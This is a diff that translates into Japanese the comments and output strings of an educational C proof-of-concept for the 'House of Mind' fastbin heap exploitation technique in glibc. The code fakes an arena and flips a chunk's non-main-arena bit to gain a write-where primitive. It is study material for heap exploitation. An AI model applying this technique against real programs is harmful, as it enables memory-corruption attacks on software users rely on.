@@ -10,30 +10,28 @@
 House of Mind - Fastbin Variant
 ==========================
 
-This attack is similar to the original 'House of Mind' in that it uses
-a fake non-main arena in order to write to a new location. This
-uses the fastbin for a WRITE-WHERE primitive in the 'fastbin'
-variant of the original attack though. The original write for this
-can be found at https://dl.packetstormsecurity.net/papers/attack/MallocMaleficarum.txt with a more recent post (by me) at https://maxwelldulin.com/BlogPost?post=2257705984. 
+この攻撃は、偽の non-main arena を使って新しい場所に書き込むという点で、
+元の 'House of Mind' に似ています。ただし、元の攻撃の 'fastbin' 版では、
+fastbin を WRITE-WHERE プリミティブ (primitive) に使います。元の解説は
+https://dl.packetstormsecurity.net/papers/attack/MallocMaleficarum.txt にあり、
+より新しい記事(私によるもの)は https://maxwelldulin.com/BlogPost?post=2257705984 にあります。
 
-By being able to allocate an arbitrary amount of chunks, a single byte
-overwrite on a chunk size and a memory leak, we can control a super
-powerful primitive. 
+任意の数のチャンクを確保でき、チャンクの size に対する 1 バイトの上書きができ、
+さらにメモリのリークがあれば、非常に強力なプリミティブを制御できます。
 
-This could be used in order to write a freed pointer to an arbitrary
-location (which seems more useful). Or, this could be used as a
-write-large-value-WHERE primitive (similar to unsortedbin attack). 
- Both are interesting in their own right though but the first
-option is the most powerful primitive, given the right setting.
+これは、解放されたポインタを任意の場所に書き込むために使えます
+(こちらのほうが有用そうです)。あるいは、
+write-large-value-WHERE プリミティブ (unsortedbin attack に似たもの) としても使えます。
+どちらもそれぞれ興味深いものですが、状況さえ整えば、最初の方法が最も強力なプリミティブです。
 
-Malloc chunks have a specified size and this size information
-special metadata properties (prev_inuse, mmap chunk and non-main arena). 
-The usage of non-main arenas is the focus of this exploit. For more information 
-on this, read https://sploitfun.wordpress.com/2015/02/10/understanding-glibc-malloc/. 
+malloc のチャンクには size が指定されており、この size 情報には
+特別なメタデータの属性 (prev_inuse、mmap チャンク、non-main arena) があります。
+この攻撃の焦点は non-main arena の利用です。詳しくは
+https://sploitfun.wordpress.com/2015/02/10/understanding-glibc-malloc/ を読んでください。
 
-First, we need to understand HOW the non-main arena is known from a chunk.
+まず、チャンクから non-main arena がどのように分かるのかを理解する必要があります。
 
-This the 'heap_info' struct: 
+これが 'heap_info' 構造体です:
 
 struct _heap_info
 {
@@ -45,13 +43,12 @@ struct _heap_info
 } heap_info; 
 - https://elixir.bootlin.com/glibc/glibc-2.23/source/malloc/arena.c#L48
 
-The important thing to note is that the 'malloc_state' within
-an arena is grabbed from the ar_ptr, which is the FIRST entry 
-of this. Malloc_state == mstate == arena 
+重要な点は、arena 内の 'malloc_state' が ar_ptr から取得されることです。
+ar_ptr はこの構造体の最初の要素です。Malloc_state == mstate == arena です。
 
-The main arena has a special pointer. However, non-main arenas (mstate)
-are at the beginning of a heap section. They are grabbed with the 
-following code below, where the user controls the 'ptr' in 'arena_for_chunk':
+main arena には特別なポインタがあります。一方、non-main arena (mstate) は
+ヒープ領域の先頭にあります。これらは次のコードで取得されます。
+'arena_for_chunk' の 'ptr' はユーザーが制御できます:
 
 #define heap_for_ptr(ptr) \
   ((heap_info *) ((unsigned long) (ptr) & ~(HEAP_MAX_SIZE - 1)))
@@ -59,43 +56,41 @@ following code below, where the user controls the 'ptr' in 'arena_for_chunk':
   (chunk_non_main_arena (ptr) ? heap_for_ptr (ptr)->ar_ptr : &main_arena)
 - https://elixir.bootlin.com/glibc/glibc-2.23/source/malloc/arena.c#L127
 
-This macro takes the 'ptr' and subtracts a large value because the 
-'heap_info' should be at the beginning of this heap section. Then, 
-using this, it can find the 'arena' to use. 
+このマクロは 'ptr' を受け取り、大きな値を引きます。'heap_info' はこのヒープ領域の
+先頭にあるはずだからです。そして、それを使って、使用する 'arena' を見つけられます。
 
-The idea behind the attack is to use a fake arena to write pointers 
-to locations where they should not go but abusing the 'arena_for_chunk' 
-functionality when freeing a fastbin chunk.
+この攻撃の考え方は、fastbin のチャンクを解放するときの 'arena_for_chunk' の機能を悪用し、
+偽の arena を使って、本来書き込まれるべきでない場所にポインタを書き込むことです。
 
-This POC does the following things: 
-- Finds a valid arena location for a non-main arena.
-- Allocates enough heap chunks to get to the non-main arena location where 
-  we can control the values of the arena data. 
-- Creates a fake 'heap_info' in order to specify the 'ar_ptr' to be used as the arena later.
-- Using this fake arena (ar_ptr), we can use the fastbin to write
-  to an unexpected location of the 'ar_ptr' with a heap pointer. 
+この POC は次のことを行います:
+- non-main arena にとって有効な arena の場所を見つけます。
+- arena のデータの値を制御できる non-main arena の場所に到達するのに
+  十分な数のヒープチャンクを確保します。
+- 後で arena として使われる 'ar_ptr' を指定するために、偽の 'heap_info' を作ります。
+- この偽の arena (ar_ptr) を使うと、fastbin を使って、
+  'ar_ptr' の想定外の場所にヒープのポインタを書き込めます。
 
-Requirements: 
-- A heap leak in order to know where the fake 'heap_info' is located at.
-	- Could be possible to avoid with special spraying techniques
-- An unlimited amount of allocations
-- A single byte overflow on the size of a chunk
-	- NEEDS to be possible to put into the fastbin. 
-	- So, either NO tcache or the tcache needs to be filled. 
-- The location of the malloc state(ar_ptr) needs to have a value larger
-  than the fastbin size being freed at malloc_state.system_mem otherwise
-  the chunk will be assumed to be invalid.
-	- This can be manually inserted or CAREFULLY done by lining up
-	  values in a proper way. 
-- The NEXT chunk, from the one that is being freed, must be a valid size
-(again, greater than 0x20 and less than malloc_state.system_mem)
+要件:
+- 偽の 'heap_info' の場所を知るための、ヒープのリーク。
+	- 特別なスプレー技法で回避できる可能性があります
+- 無制限の回数の確保
+- チャンクの size に対する 1 バイトのオーバーフロー
+	- fastbin に入れられる必要があります。
+	- つまり、tcache がないか、tcache が満杯である必要があります。
+- malloc state (ar_ptr) の場所には、解放される fastbin のサイズより大きい値が
+  malloc_state.system_mem になければなりません。そうでないと、
+  チャンクは無効だとみなされます。
+	- これは手動で挿入できます。または、値を適切に並べることで、
+	  慎重に実現できます。
+- 解放されるチャンクの「次の」チャンクは、有効な size でなければなりません
+(繰り返しになりますが、0x20 より大きく、かつ malloc_state.system_mem より小さい必要があります)
 
 
-Random perks:
-- Can be done MULTIPLE times at the location, with different sized fastbin
-  chunks. 
-- Does not brick malloc, unlike the unsorted bin attack. 
-- Only has three requirements: Infinite allocations, single byte buffer overflowand a heap memory leak. 
+ちょっとした利点:
+- 同じ場所に対して、異なるサイズの fastbin チャンクを使って、
+  複数回行えます。
+- unsorted bin attack と違って、malloc を壊しません。
+- 要件は 3 つだけです: 無限の確保、1 バイトのバッファオーバーフロー、ヒープメモリのリーク。
 
 
 
@@ -108,62 +103,61 @@ int main(){
 
 	printf("House of Mind - Fastbin Variant\n");
 	puts("==================================");
-	printf("The goal of this technique is to create a fake arena\n");
-	printf("at an offset of HEAP_MAX_SIZE\n");
+	printf("この技法の目的は、HEAP_MAX_SIZE のオフセットの位置に\n");
+	printf("偽の arena を作ることです\n");
 	
-	printf("Then, we write to the fastbins when the chunk is freed\n");
-	printf("This creates a somewhat constrained WRITE-WHERE primitive\n");
-	// Values for the allocation information.	
+	printf("そして、チャンクが解放されるときに fastbin へ書き込みます\n");
+	printf("これにより、ある程度制約のある WRITE-WHERE プリミティブ (primitive) ができます\n");
+	// 確保に関する情報の値。	
 	int HEAP_MAX_SIZE = 0x4000000;
 	int MAX_SIZE = (128*1024) - 0x100; // MMap threshold: https://elixir.bootlin.com/glibc/glibc-2.23/source/malloc/malloc.c#L635
 
-	printf("Find initial location of the heap\n");
-	// The target location of our attack and the fake arena to use
+	printf("ヒープの最初の位置を見つけます\n");
+	// 攻撃の対象の場所と、使用する偽の arena
 	uint8_t* fake_arena = malloc(0x1000); 
 	uint8_t* target_loc = fake_arena + 0x30;
 
 	uint8_t* target_chunk = (uint8_t*) fake_arena - 0x10;
 
 	/*
-	Prepare a valid 'malloc_state' (arena) 'system_mem' 
-	to store a fastbin. This is important because the size
-	of a chunk is validated for being too small or too large
-	via the 'system_mem' of the 'malloc_state'. This just needs
-	to be a value larger than our fastbin chunk.
+	fastbin を格納するために、有効な 'malloc_state' (arena) の 'system_mem' を
+	用意します。これが重要なのは、チャンクの size が小さすぎないか、
+	大きすぎないかが、'malloc_state' の 'system_mem' で検証されるからです。
+	この値は、fastbin のチャンクより大きければ十分です。
 	*/
-	printf("Set 'system_mem' (offset 0x888) for fake arena\n");
+	printf("偽の arena の 'system_mem' (オフセット 0x888) を設定します\n");
 	fake_arena[0x888] = 0xFF;
 	fake_arena[0x889] = 0xFF; 
 	fake_arena[0x88a] = 0xFF; 
 
-	printf("Target Memory Address for overwrite: %p\n", target_loc);
-	printf("Must set data at HEAP_MAX_SIZE (0x%x) offset\n", HEAP_MAX_SIZE);
+	printf("上書きする対象のメモリアドレス: %p\n", target_loc);
+	printf("HEAP_MAX_SIZE (0x%x) のオフセットの位置にデータを設定する必要があります\n", HEAP_MAX_SIZE);
 
-	// Calculate the location of our fake arena
+	// 偽の arena の位置を計算します
 	uint64_t new_arena_value = (((uint64_t) target_chunk) + HEAP_MAX_SIZE) & ~(HEAP_MAX_SIZE - 1);
 	uint64_t* fake_heap_info = (uint64_t*) new_arena_value;
 
 	uint64_t* user_mem = malloc(MAX_SIZE);
-	printf("Fake Heap Info struct location: %p\n", fake_heap_info);
-	printf("Allocate until we reach a MAX_HEAP_SIZE offset\n");	
+	printf("偽の Heap Info 構造体の位置: %p\n", fake_heap_info);
+	printf("MAX_HEAP_SIZE のオフセットに到達するまで確保します\n");	
 
 	/* 
-	The fake arena must be at a particular offset on the heap.
-	So, we allocate a bunch of chunks until our next chunk
-	will be in the arena. This value was calculated above.
+	偽の arena は、ヒープ上の特定のオフセットになければなりません。
+	そのため、次のチャンクがその arena 内に入るまで、
+	多数のチャンクを確保します。この値は上で計算しました。
 	*/
 	while((long long)user_mem < new_arena_value){
 		user_mem = malloc(MAX_SIZE);
 	}
 
-	// Use this later to trigger craziness
-	printf("Create fastbin sized chunk to be victim of attack\n");
-	uint64_t* fastbin_chunk = malloc(0x50); // Size of 0x60
-	uint64_t* chunk_ptr = fastbin_chunk - 2; // Point to chunk instead of mem
-	printf("Fastbin Chunk to overwrite: %p\n", fastbin_chunk);
+	// 後でこれを使って、とんでもない事態を引き起こします
+	printf("攻撃の被害者となる fastbin サイズのチャンクを作ります\n");
+	uint64_t* fastbin_chunk = malloc(0x50); // size は 0x60
+	uint64_t* chunk_ptr = fastbin_chunk - 2; // mem ではなくチャンクを指します
+	printf("上書きする Fastbin チャンク: %p\n", fastbin_chunk);
 
-	printf("Fill up the TCache so that the fastbin will be used\n");
-	// Fill the tcache to make the fastbin to be used later. 
+	printf("fastbin が使われるように、TCache を埋めます\n");
+	// 後で fastbin が使われるように、tcache を埋めます。
 	uint64_t* tcache_chunks[7];
 	for(int i = 0; i < 7; i++){
 		tcache_chunks[i] = malloc(0x50);
@@ -174,62 +168,60 @@ int main(){
 
 
 	/*
-	Create a FAKE malloc_state pointer for the heap_state
-	This is the 'ar_ptr' of the 'heap_info' struct shown above. 
-	This is the first entry in the 'heap_info' struct at offset 0x0
-	 at the heap.
+	heap_state 用の偽の malloc_state ポインタを作ります。
+	これは、上で示した 'heap_info' 構造体の 'ar_ptr' です。
+	これはヒープ上の 'heap_info' 構造体の最初の要素で、
+	オフセット 0x0 にあります。
 
-	We set this to the location where we want to write a value to.
-	The location that gets written to depends on the fastbin chunk
-	size being freed. This will be between an offset of 0x8 and 0x40
-	bytes. For instance, a chunk with a size of 0x20 would be in the
-	0th index of fastbinsY struct. When this is written to, we will
-	write to an offset of 8 from the original value written.
+	これを、値を書き込みたい場所に設定します。
+	実際に書き込まれる場所は、解放される fastbin チャンクの
+	サイズによって決まります。オフセットは 0x8 から 0x40 バイトの間になります。
+	例えば、size が 0x20 のチャンクは fastbinsY 構造体の
+	0 番目のインデックスに入ります。これに書き込むときは、
+	書き込んだ元の値から 8 のオフセットの位置に書き込むことになります。
 	- https://elixir.bootlin.com/glibc/glibc-2.23/source/malloc/malloc.c#L1686
 	*/
-	printf("Setting 'ar_ptr' (our fake arena)  in heap_info struct to %p\n", fake_arena);
-	fake_heap_info[0] = (uint64_t) fake_arena; // Setting the fake ar_ptr (arena)
-	printf("Target Write at %p prior to exploitation: 0x%x\n", target_loc, *(target_loc));
+	printf("heap_info 構造体の 'ar_ptr' (偽の arena) を %p に設定します\n", fake_arena);
+	fake_heap_info[0] = (uint64_t) fake_arena; // 偽の ar_ptr (arena) を設定します
+	printf("攻撃前の、%p への書き込み対象の値: 0x%x\n", target_loc, *(target_loc));
 
 	/*
-	Set the non-main arena bit on the size. 
-	Additionally, we keep the size the same as the original
-	allocation because there is a sanity check on the fastbin (when freeing)
-	that the next chunk has a valid size. 
+	size に non-main arena ビットを設定します。
+	さらに、size は元の確保時と同じに保ちます。fastbin には
+	(解放時に) 次のチャンクが有効な size を持つかどうかの
+	健全性チェックがあるためです。
 
-	When grabbing the non-main arena, it will use our choosen arena!
-	From there, it will write to the fastbin because of the size of the
-	chunk.
+	non-main arena を取得するときに、私たちが選んだ arena が使われます!
+	そこから、チャンクの size のために、fastbin へ書き込みが行われます。
 
-	///// Vulnerability! Overwriting the chunk size 
+	///// 脆弱性! チャンクの size を上書きします
 	*/
-	printf("Set non-main arena bit on the fastbin chunk\n");
-	puts("NOTE: This keeps the next chunk size valid because the actual chunk size was never changed\n");
-	chunk_ptr[1] = 0x60 | 0x4; // Setting the non-main arena bit
+	printf("fastbin のチャンクに non-main arena ビットを設定します\n");
+	puts("注: 実際のチャンクの size は変更していないので、次のチャンクの size は有効なままです\n");
+	chunk_ptr[1] = 0x60 | 0x4; // non-main arena ビットを設定します
 
-	//// End vulnerability 
+	//// 脆弱性ここまで
 
 	/*
-	The offset being written to with the fastbin chunk address
-	depends on the fastbin BEING used and the malloc_state itself. 
-	In 2.31, the offset from the beginning of the malloc_state
-	to the fastbinsY array is 0x10. Then, fastbinsY[0x4] is an 
-	additional byte offset of 0x20. In total, the writing offset
-	from the arena location is 0x30 bytes.
-	from the arena location to where the write actually occurs. 
-	This is a similar concept to bk - 0x10 from the unsorted
-	bin attack. 
+	fastbin チャンクのアドレスが書き込まれるオフセットは、
+	使われている fastbin と malloc_state 自体によって決まります。
+	2.31 では、malloc_state の先頭から fastbinsY 配列までの
+	オフセットは 0x10 です。さらに、fastbinsY[0x4] は
+	追加で 0x20 バイトのオフセットです。合計すると、arena の位置からの
+	書き込みオフセットは 0x30 バイトです。
+	arena の位置から、実際に書き込みが行われる場所までです。
+	これは、unsorted bin attack の bk - 0x10 に似た考え方です。
 	*/
 
-	printf("When we free the fastbin chunk with the non-main arena bit\n");
-	printf("set, it will cause our fake 'heap_info' struct to be used.\n");
-	printf("This will dereference our fake arena location and write\n");
-	printf("the address of the heap to an offset of the arena pointer.\n");
+	printf("non-main arena ビットが設定された fastbin のチャンクを解放すると、\n");
+	printf("偽の 'heap_info' 構造体が使われます。\n");
+	printf("これにより、偽の arena の場所が参照され、\n");
+	printf("arena ポインタのあるオフセットの位置にヒープのアドレスが書き込まれます。\n");
 
-	printf("Trigger the magic by freeing the chunk!\n");
-	free(fastbin_chunk); // Trigger the madness
+	printf("チャンクを解放して、魔法を発動させます!\n");
+	free(fastbin_chunk); // 狂乱を引き起こします
 
-	// For this particular fastbin chunk size, the offset is 0x28. 
-	printf("Target Write at %p: 0x%llx\n", target_loc, *((unsigned long long*) (target_loc)));
+	// この fastbin のチャンクサイズでは、オフセットは 0x28 です。
+	printf("%p への書き込み対象の値: 0x%llx\n", target_loc, *((unsigned long long*) (target_loc)));
 	assert(*((unsigned long *) (target_loc)) != 0);
 }
